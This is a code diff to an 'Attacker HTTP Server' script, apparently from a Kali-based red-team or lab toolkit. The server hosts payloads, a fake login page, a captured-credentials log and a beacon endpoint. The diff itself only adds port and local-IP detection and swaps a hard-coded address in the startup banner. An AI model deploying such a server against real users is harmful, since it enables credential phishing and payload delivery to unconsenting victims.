@@ -14,10 +14,23 @@ Usage: python3 tools/http_server.py [port]
 
 import http.server, socketserver, urllib.parse, json, datetime, os, sys
 
-PORT  = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
+PORT  = int(sys.argv[1]) if len(sys.argv) > 1 else int(os.getenv("KALI_PORT", 8080))
 ROOT  = os.path.join(os.path.dirname(__file__), "..", "payloads")
 TMPL  = os.path.join(os.path.dirname(__file__), "..", "templates", "fake_login.html")
 CREDS = "captured_credentials.log"
+
+def local_ip():
+    import socket
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return os.getenv("KALI_IP", "127.0.0.1")
+
+KALI_IP = os.getenv("KALI_IP") or local_ip()
 
 
 def ts():
@@ -96,9 +109,9 @@ def main():
     print(f"  Attacker HTTP Server  —  port {PORT}")
     print(f"  Payloads dir : {ROOT}")
     print(f"  Creds log    : {CREDS}")
-    print(f"  Landing page : http://192.168.11.149:{PORT}/")
-    print(f"  Beacon URL   : http://192.168.11.149:{PORT}/beacon")
-    print(f"  Payloads     : http://192.168.11.149:{PORT}/payloads/<file>")
+    print(f"  Landing page : http://{KALI_IP}:{PORT}/")
+    print(f"  Beacon URL   : http://{KALI_IP}:{PORT}/beacon")
+    print(f"  Payloads     : http://{KALI_IP}:{PORT}/payloads/<file>")
     print("  Ctrl+C to stop")
     print("=" * 55 + "\n")
     with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as s:
